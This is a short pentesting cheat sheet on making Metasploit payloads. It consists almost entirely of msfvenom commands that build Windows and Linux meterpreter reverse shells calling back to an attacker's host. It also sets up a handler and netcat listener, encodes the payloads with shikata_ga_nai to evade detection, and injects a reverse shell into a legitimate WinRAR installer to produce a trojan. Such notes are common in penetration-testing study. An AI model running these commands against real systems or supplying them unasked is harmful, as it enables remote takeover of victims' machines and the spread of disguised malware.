# Payload With Metasploit

## msfvenom

```bash
msfvenom --list payloads
msfvenom --list formats
#example usage 32 bit
msfvenom -a x86 -p /windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > payloadx86.exe
#example usage 64 bit
msfvenom -a x64 -p /windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > payloadx64.exe
#example linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > payloadx86
```

## Listener

```bash
use multi/handler
set payload /windows/meterpreter/reverse_tcp # the same as the one used in msfvenom
set LHOST
set LPORT
run
```

Or just use netcat

```bash
nc -nvlp 4444
```

## Encoding

```bash
msfvenom --list encoders
#example windows 32bit payload with encoding
msfvenom -a x86 -p /windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i 10 -e x86/shikata_ga_nai -f exe > payloadx86.exe
```

### Injecting Payloads Into Windows Portable Executables

```bash
#example using winrar portable 32bit
msfvenom -p /windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i 10 -e x86/shikata_ga_nai -f exe -x /home/download/winrar32.exe > winrar_injected.exe
#this will keep the original functionality (but not work for most portable exe)
msfvenom -p /windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -i 10 -e x86/shikata_ga_nai -f exe -k -x /home/download/winrar32.exe > winrar_injected.exe
```
